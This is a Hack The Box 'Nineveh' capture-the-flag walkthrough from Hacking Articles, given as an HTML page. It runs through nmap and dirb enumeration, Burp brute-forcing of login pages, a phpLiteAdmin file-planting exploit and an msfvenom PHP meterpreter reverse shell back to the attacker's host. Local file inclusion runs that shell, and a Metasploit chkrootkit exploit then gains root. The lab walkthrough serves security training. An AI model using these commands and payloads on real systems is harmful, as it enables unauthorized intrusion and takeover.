@@ -1,0 +1,115 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Hack The Box : Nineveh Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-nineveh-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-06-27T07:41:06+00:00">June 27, 2018</time><time class="updated" datetime="2025-07-05T17:52:15+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “<strong>Nineveh</strong>” which is categories as retired lab presented by <strong>Hack the Box</strong> for making online penetration practices. </span></p>
+<p><span style="color: #000000;"><strong>Level: </strong>Intermediate</span></p>
+<p><span style="color: #000000;"><strong>Task:</strong> find <strong>user.txt</strong> and <strong>root.txt</strong> file on the victim’s machine.</span></p>
+<h3><span style="color: #800000;">Penetration Methodology</span></h3>
+<p><strong>Scanning</strong></p>
+<ul>
+<li><span style="color: #000000;">Open port and running services (Nmap)</span></li>
+</ul>
+<p><strong>Enumeration</strong></p>
+<ul>
+<li><span style="color: #000000;">Enumerating Web Directories (Dirb)</span></li>
+</ul>
+<p><strong>Exploiting</strong></p>
+<ul>
+<li><span style="color: #000000;">Brute force on PHPliteAdmin (Burp Suite)</span></li>
+<li><span style="color: #000000;">Spawning Shell (Metasploit)</span></li>
+<li><span style="color: #000000;">Get user.txt</span></li>
+</ul>
+<p><strong>Privilege Escalation</strong></p>
+<ul>
+<li><span style="color: #000000;">User.txt</span></li>
+</ul>
+<h3><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;">Walk-Through</span></span></h3>
+<h3><span style="color: #800000;">Scanning</span></h3>
+<p><span style="color: #000000;">Since these labs are online accessible therefore they have static IP. The IP of Nineveh is <strong>10.10.10.43</strong> so let’s initiate with nmap port enumeration.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.43</pre>
+<p><span style="color: #000000;">it enumerated port 80 and 443 are open.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Kw0zf_sGwVQ/WzM6uKXRW7I/AAAAAAAAXjE/4jHlHRZitQMNkQjtRPA76IytmKpAki0aACEwYBhgL/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">We explored port 80 but didn’t observe any remarkable clue for next step.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-3X1hB90mnC8/WzM6wJJlLRI/AAAAAAAAXkg/7KXyXbOK03E9T1xjZuBOaf79zNDJcLwqACEwYBhgL/s1600/2.png"/></span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">So next, we use the dirb tool of Kali to enumerate the directories and found some important directories such as http://10.10.10.43/department/  then went to the web browser to explore them.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.10.43 /usr/share/wordlists/dirb/big.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-XiHIwBiR390/WzM6xGEsukI/AAAAAAAAXkg/1XvXil9L2KgPuJDzwdWO1GGW5qVc0pL4QCEwYBhgL/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">It put-up login page as shown here.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vRk_n8E8yFc/WzM6xZQ0mhI/AAAAAAAAXkw/Gic81oyjGfwwh0__IUev4poCRKZMmSv6wCEwYBhgL/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">So we try the random combination of username and password. While we have enter username: admin and Password: password it gave an error “Invalid Password” hence it was sure that the username must be the admin.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-c8yuwofXWjU/WzM6xsYtPJI/AAAAAAAAXko/vn6_OXf4Rvsd_ljbQlXuw9QsUvAbs1RagCEwYBhgL/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Then with help of burp suit, we made brute force attack and use the rockyou.txt file as password dictionary. Thus we obtain the correct combination for login.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Username: admin
+Password: 1q2w3e4r5t</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-esHvIAeQJNw/WzM6xqEuLKI/AAAAAAAAXks/i7ShXNK7Y-A3CFKlWAk1S6puyeoKfqyMgCEwYBhgL/s1600/6.png"/></span></p>
+<p> </p>
+<p><span style="color: #000000;">Used above credential for login and get into admin console as shown.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/--02xkpAsrE0/WzM6yBY4tEI/AAAAAAAAXkw/jevr2nZbVZ4iMgjKLzbegTWPidEJeLY2gCEwYBhgL/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">At Notes tab we concluded that the given text of a file stored at someplace in the system entitled with ninevehNotes.txt.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-v7QFhos8yuM/WzM6yKFgL9I/AAAAAAAAXk0/owtwByv6oS8MXTRaAJ8-PdaxADl5hFInACEwYBhgL/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">After that we also explored port 443 and observe the following web page. We also look at it view source but didn’t notice any further hint.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-4OCN4j6LKzE/WzM6utoa1UI/AAAAAAAAXkc/l3sefF8FYVEui8hJSNDjbVx7aC6-VuQNQCEwYBhgL/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Therefore again use dirb tool for directory brute force attack and observe the /db directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb https://10.10.10.43 /usr/share/wordlists/dirb/big.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QQt3-SWKgJA/WzM6uArG0NI/AAAAAAAAXkc/5bkZ1-_yNcMpUPbhd6t3KtPJxW4EAyqgACEwYBhgL/s1600/11.png"/></span></p>
+<h3><span style="color: #800000;">Exploiting</span></h3>
+<p><span style="color: #000000;">For a second time, we explored the above-enumerated directory and observe login page for phpliteAdmin v1.9.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9LlfJ9Er_00/WzM6utTQq-I/AAAAAAAAXk0/OEdgDfPwrVAhENrw_YxZYy9D2E6gsyMvQCEwYBhgL/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">Again we lunch brute forced the password field on /db with burp suit and got the password: password123.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-lzGDkq0k4Xk/WzM6uqf0SvI/AAAAAAAAXkc/pdnlXioB8HU7h06ouxGQGAkxTrI2XSfwgCEwYBhgL/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">By using <strong>password123</strong> and we get inside the PHPLiteAdmin dashboard. Then with help of Google, we found the trick to exploit it after reading the description from exploit DB 24044.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--0T2jGFpeFM/WzM6uxZyNII/AAAAAAAAXko/m---_vsYVGc9wLVulzd2f1CtazBUiulkACEwYBhgL/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">After reading the description from exploit 24044 then we create a new database “ninevehNotes.txt.shell.php”</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-AoSp9WWKkF0/WzM6vClYIBI/AAAAAAAAXkk/yO95oaZ-2Do5MrzAdW0fybcmASKx_4wuwCEwYBhgL/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">Here we have created a new table “Demo” and Add! Filed inside this.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-dI4AAoB-4kc/WzM6vd7B8FI/AAAAAAAAXkc/UVxEOey3jrcR03_78lK2a1PzBZNONWviQCEwYBhgL/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">Now create an entry in filed 1 as shown.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-HksTkjgPmpU/WzM6vUgs3mI/AAAAAAAAXks/kK61LOq-cJElH8L-SP5z7d3jrDELFRsNwCEwYBhgL/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">Let’s create a PHP payload for injecting inside the new database. We have to use the msfvenom command for generating PHP backdoor.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.25 lport=4444 -f raw</pre>
+<p><span style="color: #000000;">Now <strong>copy</strong> the code from <strong>*&lt;?php….die();</strong> and start multi handler in a new terminal</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ZVGvJtSzJQQ/WzM6viMCJaI/AAAAAAAAXkk/u0vakgUP-uUDIL8YqS5cBJ66nNDIK-LIACEwYBhgL/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">GO to insert tab and Past above-copied code inside the text field given for Value.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-CX0HbED1nUY/WzM6v2ol4SI/AAAAAAAAXko/TN3S2Z11sWIkrOAoWW29RbaGpO2kkMGtACEwYBhgL/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">At last you will notice <strong>/var/tmp/ ninevehNotes.txt.shell.php</strong> is the Path for your database.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-DhAdprRCAg8/WzM6wEX8RnI/AAAAAAAAXkw/GyoeE9i11doXg5R3g4sIxxLUAk4CvsU8QCEwYBhgL/s1600/20.png"/></span></p>
+<p><span style="color: #000000;">If you remember, we had already access admin console and observed a tab for Notes, use it to execute your backdoor.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.txt.shell.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-S0fVdTdD5y8/WzM6wlB0pHI/AAAAAAAAXks/7EjN3tMFSGAMhxfnxyFZL1dNQM5B3LEWQCEwYBhgL/s1600/22.png"/></span></p>
+<p><span style="color: #000000;">Meanwhile, return to the Metasploit terminal and wait for the meterpreter session by exploiting multi handler.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf use exploit/multi/handler
+msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 10.10.14.25
+msf exploit(multi/handler) set lport 4444
+msf exploit(multi/handler) exploit</pre>
+<p><span style="color: #000000;">From given below image you can observe <strong>meterpreter session 1</strong>. But the task is not finished yet, still, we need to penetrate more for privilege escalation.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter &gt; sysinfo
+meterpreter &gt; cd /home
+meterpreter &gt; ls
+meterpreter &gt; cd amrois
+meterpreter &gt;ls
+meterpreter &gt; cat user.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-DkFnZjPf-D4/WzM6wyYNdTI/AAAAAAAAXko/IMmNe-JrP_ARAsFz7yfav_sWcUkuULOZgCEwYBhgL/s1600/24.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation </span></h3>
+<p><span style="color: #000000;">After doing a little bit enumeration we notice a directory report is owned by the user amrois and these reports were being continuously generated by chkrootkit in every minute.</span></p>
+<p><span style="color: #000000;">With help of Google, we came to know that Metasploit contains an exploit for chkrootkit exploitation. After entering following command as shown in the given image to load <strong>exploit/unix/local/chkrootkit </strong>module then set <strong>session 1 </strong>and arbitrary<strong> lport</strong> such as <strong>4545 </strong>and run the module.</span></p>
+<p><span style="color: #000000;">This will give another session, as you can see we have spawned <strong>command shell</strong> of the target’s machine. Now if you will check uid by typing <strong>id</strong> it will show <strong>uid=0 as root</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">id
+cd /root</pre>
+<p><span style="color: #000000;">And to see the list of files in /root type:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls -lsa</pre>
+<p><span style="color: #000000;">In the list you will see that there is a text file and read that file type :</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat root.txt</pre>
+<p><span style="color: #000000;">Congrats!! We hit Goal finished both tasks and at end obtain the root access.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-0JCv-i9CYyM/WzM6w1mKK5I/AAAAAAAAXkk/MY7aXtJYaIYzCetnCrz46b5lkGXvzmOWQCEwYBhgL/s1600/25.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
